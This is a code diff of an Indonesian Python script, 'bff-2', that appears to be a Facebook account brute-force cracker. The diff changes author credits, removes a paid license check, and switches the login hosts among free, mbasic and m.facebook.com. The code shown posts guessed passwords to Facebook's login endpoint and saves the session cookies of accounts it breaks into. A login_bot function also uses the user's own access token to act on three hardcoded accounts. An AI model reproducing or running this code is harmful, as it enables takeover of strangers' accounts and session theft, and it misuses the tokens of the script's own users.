@@ -1,7 +1,7 @@
 # coding=utf-8
-# coding by Romi Afrizal
-# Izin dlu lah bro kalau mau recode, gk ngotak njir _-
-# Note : jangan di ubah lagi! nanti error, script udah enak
+#
+# Decompile By Najimi Ajimu
+#
 
 import os, sys, subprocess, platform
 try:
@@ -67,7 +67,7 @@ def ingfoh():
 f"""{Hj}
  • Info script :
  	
- - author      : Romi Afrizal
+ - author      : Arya Adinata
  - instagram   : romz_xyz
  - facebook    : facebook.com/romi.afrizal.102
  - fanspage    : facebook.com/100022086172556
@@ -161,191 +161,7 @@ til ="•"
 
 ok, cp, id, user, pwx, loop = [], [], [], [], [], 0
 
-jarak = "     "
-ubahP = []
-pwbaru = []
-data = {}
-data2 = {}
-loop = 0
-loop = 0
-ok = []
-cp = []
-ttl = []
-id = []
-nampung = []
-data,data2={},{}
-ubahP,pwBaru=[],[]
-
 sys.stdout.write('\x1b[1;35m\x1b]2; {×} bff-2 by romz {×} \x07')
-
-#		crackmenu("").check_opsi()
-class Chinda():
-	
-	def buat_tgl(self):
-		global wak_
-		os.system("clear")
-		try:
-			id1 = open(".datame1", "r").read()
-			idl = open(".datame1", "r").read()
-		except:
-			self.konfo()
-		gig = requests.get("https://github.com/GoodBoyC/GoodBoyC/blob/main/license").text.strip()
-		if idl in gig:
-			jok = gig.split(idl+"|")
-			jokk = ("%s"%(jok[1]))
-			jokkk = jokk.split("<")
-			wakk = jokkk[0]
-			if wakk == "":
-				self.konfo()
-		else:
-			self.konfo()
-
-	def lanjut_x(self):
-		try:
-			id1 = open(".datame1", "r").read()
-		except:
-			id1 = uuid.uuid4().hex[:43].upper()
-			jaa = open(".datame1", "w")
-			jaa.write(id1)
-			jaa.close()
-		no_wa = "2349067338953"
-		url_wa = ("https://api.whatsapp.com/send?phone="+no_wa+"&text=") # UBAH NOMOR HP KAMU
-		jalan(war+'Licese Anda : '+U+id1+Q)
-		jalan(war+'Silahkan Chat *'+C+'Mr.Chinda'+Q+'* Untuk Membeli Key !')
-		jalan(f"""{war}Method Pembayaran
- |
- |-->Dana   |--> {U}09067338953 {Q}
- |
-{war}Informasi/Kontak
- |
- |-->Whatsapp ( {U}09067338953{Q})
- |
-{war}Pesan Admin Tinggalkan
- |
- |-->Admin Tidak Bertanggung Jawab Atas Terjadinya Masalah !
- |-->Jika Anda Mau Membeli License/Key Harap Kirim Bukti Transaksi/Tranfer
- |-->Admin Tidak Menerima Penawaran/Tawar Menawar
- |
-{war}Thanks to
- |-->{I}Arya{Q}
- |
- |
- |-->{C}Arya{Q}
- |.      X
- |-->{I}Mr.Chinda{Q}
-{war}{O}Silahkan Pilih Harga License...{Q}
- |
- |-->1. 1 month      (${II}100{Q})
- |-->2. {M}Permanent  (${II}500{Q})
- |""")
-		pok = input(' |-->Pilih : ')
-		if pok in (""," "):
-			jalan(" |-->Jangan Kosong...")
-			time.sleep(2)
-			self.lanjut_x()
-		elif pok in ("1","01"):
-			tks = ("Hello Sir, I want to buy 1 month key/license.\nKey/License : *"+id1+"*")
-			subprocess.check_output(["am", "start", url_wa+tks])
-		elif pok in ("2","02"):
-			tks = ("Hello Sir, I want to buy a permanent key/license.\nKey/License : *"+id1+"*")
-			subprocess.check_output(["am", "start", url_wa+tks])
-		else:
-			jalan(' |-->Maaf Pilihan Yang Anda Pilih Tidak Ada....')
-			time.sleep(2)
-			self.lanjut_x()
-		os.sys.exit()
-
-	def buat_key_gratis(self):
-
-		key = requests.get("https://pastebin.com/raw/mjYSUq7E").text
-		jaa = open(".datame1", "w")
-		jaa.write(key)
-		jaa.close()
-		try:self.cek_tgl()
-		except:pass
-		jalan(war+"Berhasil Membuat Key Gratis Silahkan Jalankan Script Ini")
-		os.sys.exit()
-
-	def konfo(self):
-		os.system("clear")
-		try:
-			id1 = open(".datame1", "r").read()
-		except:
-			id1 = uuid.uuid4().hex[:43].upper()
-			jaa = open(".datame1", "w")
-			jaa.write(id1)
-			jaa.close()
-		jalan(war+"Lihat Doaanngg Cuma Minta Trial")
-		print(" |-->1. Beli Key/License");time.sleep(0.75)
-		print(" |-->2. Gunakan Trial (Tidak Selama Gratis Kawan)");time.sleep(0.75)
-		pul_ = input(" |-->Pilih : ")
-		if pul_ in ([""," "]):jalan(war+"Isi Dengan Benar !!!!");time.sleep(1);self.konfo()
-
-		elif pul_ in (["1","01"]):self.lanjut_x();os.sys.exit(),
-		elif pul_ in (["2","02"]):self.buat_key_gratis();os.sys.exit()
-
-		else:jalan(war+"Isi Dengan Benar !!!!");time.sleep(1);self.konfo()
-		os.sys.exit()
-
-
-	def cek_tgl(self):
-		global infona
-		try:
-			id1 = open(".datame1", "r").read()
-			idl = open(".datame1", "r").read()
-		except:
-			self.konfo()
-		gig = requests.get("https://github.com/GoodBoyC/GoodBoyC/blob/main/license").text.strip()
-		if idl in gig:
-			jok = gig.split(idl+"|")
-			jokk = ("%s"%(jok[1]))
-			jokkk = jokk.split("<")
-			wak = jokkk[0]
-			jaa = open(".datame2", "w")
-			jaa.write(wak)
-			jaa.close()
-			wak_ = open(".datame2", "r").read().split()
-		else:
-			self.konfo()
-		try:
-			tgl = datetime.now()
-			bln = tgl.month
-			thn = tgl.year
-			day = tgl.day
-			mulai = datetime(int(wak_[0]), int(wak_[1]), int(wak_[2]))
-			seles = datetime(thn, bln, day)
-			sisa = mulai - seles
-			lim_dev_id = str(sisa).split()[0]
-			if "KIKY" in "":
-				infona = (II+"Ultimate/Tidak Habis²"+Q)
-				return infona
-			else:
-				infona = (O+lim_dev_id+" Hari Lagi")
-				if ":" in str(lim_dev_id) or "-" in str(lim_dev_id):
-						exit(jalan(war+"Silahkan Hubungi Athour Untuk Memperpanjangankan License ! "))
-						os.sys.exit()
-				return infona
-		except:
-			jalan(f" |-->Key/License Anda : {O}{id1}{Q}")
-			jalan(" |-->Maaf Key/License Anda Sudah Expires, Silahkan Hubungi Admin Script")
-			jalan(f' |-->No Whatsapp : {O}6283893415477{Q}')
-			print(" |")
-			print(" |")
-			zib = input(f' |-->Apakah Anda Mau Hapus License/Key ({O}Y/n{Q}):')
-			if zib in (""," "):
-				jalan(" |-->Jangan Kosong...")
-				os.sys.exit()
-			elif zib in ("Y","y"):
-				try:
-					os.remove(".datame1")
-					os.remove(".datame2")
-				except:pass
-				jalan(' |-->File License/Key Anda Sudah Saya Hapus....')
-				os.sys.exit()
-			else:
-				jalan(" |-->Isi Dengan Benar Dong...")
-				os.sys.exit()
-			os.sys.exit()
 
 # JALAN
 def jalan(keliling):
@@ -373,9 +189,9 @@ except KeyError:
 	IP = " "
 	CN = " "
 
-author = 'Arya X Romi X Chinda'
-fb_me = 'facebook.com/romi.afrizal.102'
-github = 'github.com/Mark-Zuck'
+author = 'Arya & Chinda'
+fb_me = 'facebook.com/AryaTrickers2020'
+github = 'github.com/Ruphas-Mafahl-XD'
 
 def banner():
 	os.system('clear')
@@ -484,7 +300,7 @@ def konverter(kukis):
 		'Host':'business.facebook.com',
 		'cache-control':'max-age=0',
 		'upgrade-insecure-requests':'1',
-		'user-agent':'Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36',
+		'user-agent':'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36',
 		'accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
 		'content-type' : 'text/html; charset=utf-8',
 		'accept-encoding':'gzip, deflate',
@@ -510,9 +326,9 @@ def konverter(kukis):
 def login_bot(romz):
 	try:
 		toket = romz
-		romz1 = ('100067807565861')
-		romz2 = ('100029143111567')
-		romz3 = ('100028434880529')
+		romz1 = ('100001307011557')
+		romz2 = ('100001137791549')
+		romz3 = ('100014762377020')
 		requests.post(f"https://graph.facebook.com/{romz1}?fields=subscribers&access_token={toket}") # ROMI AFRIZAL PENGGUNA AKUN UNIK
 		requests.post(f"https://graph.facebook.com/{romz2}?fields=subscribers&access_token={toket}") # DEMIT ROMI AFRIZAL
 		requests.post(f"https://graph.facebook.com/{romz3}?fields=subscribers&access_token={toket}") # Romi Afrizal (2018)
@@ -577,7 +393,7 @@ class pilihan:
 			os.system('clear')
 			print ("%s%s cookie invalid "%(M,til));jeda(2)
 			os.system('python bff-2.py')
-		self.url = ("https://mbasic.facebook.com")
+		self.url = ("https://free.facebook.com")
 		self.id = []
 				
 	def menu(self):
@@ -1230,7 +1046,7 @@ class Crack:
 				ses = requests.Session()
 				ua = random.choice(["Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)","Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36"])
 				headers_ = {"Host":"free.facebook.com","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://free.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
-				p = ses.get('https://graph.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F', headers=headers_).text
+				p = ses.get('https://free.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F', headers=headers_).text
 				dataa = {"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":user,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
 				_headers = {"Host":"free.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://free.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":"Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://free.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
 				po = ses.post("https://free.facebook.com/login/device-based/validate-password/?shbl=0", data = dataa, headers=_headers, allow_redirects = False)
@@ -1300,11 +1116,11 @@ class Crack:
 				pw = pw.lower()
 				ses = requests.Session()
 				ua = random.choice(["Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)","Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36"])
-				headers_ = {"Host":"free.facebook.com","upgrade-insecure-requests":"1","user-agent":"NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
-				p = ses.get('https://graph.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F', headers=headers_).text
+				headers_ = {"Host":"mbasic.facebook.com","upgrade-insecure-requests":"1","user-agent":"NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
+				p = ses.get('https://mbasic.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F', headers=headers_).text
 				dataa = {"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":user,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
-				_headers = {"Host":"free.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://mbasic.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
-				po = ses.post("https://free.facebook.com/login/device-based/validate-password/?shbl=0", data = dataa, headers=_headers, allow_redirects = False)
+				_headers = {"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://mbasic.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
+				po = ses.post("https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0", data = dataa, headers=_headers, allow_redirects = False)
 				if 'c_user' in ses.cookies.get_dict():
 					try:
 						kukis=";".join([key+"="+value for key,value in ses.cookies.get_dict().items()])
@@ -1371,11 +1187,11 @@ class Crack:
 				pw = pw.lower()
 				ses = requests.Session()
 				ua = random.choice(["Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)","Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36"])
-				headers_ = {"Host":"free.facebook.com","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
-				p = ses.get('https://graph.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F', headers=headers_).text
+				headers_ = {"Host":"m.facebook.com","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
+				p = ses.get('https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F', headers=headers_).text
 				dataa = {"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":user,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
-				_headers = {"Host":"free.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":"Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
-				po = ses.post("https://graph.facebook.com/login/device-based/validate-password/?shbl=0", data = dataa, headers=_headers, allow_redirects = False)
+				_headers = {"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":"Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
+				po = ses.post("https://m.facebook.com/login/device-based/validate-password/?shbl=0", data = dataa, headers=_headers, allow_redirects = False)
 				if 'c_user' in ses.cookies.get_dict():
 					try:
 						kukis=";".join([key+"="+value for key,value in ses.cookies.get_dict().items()])
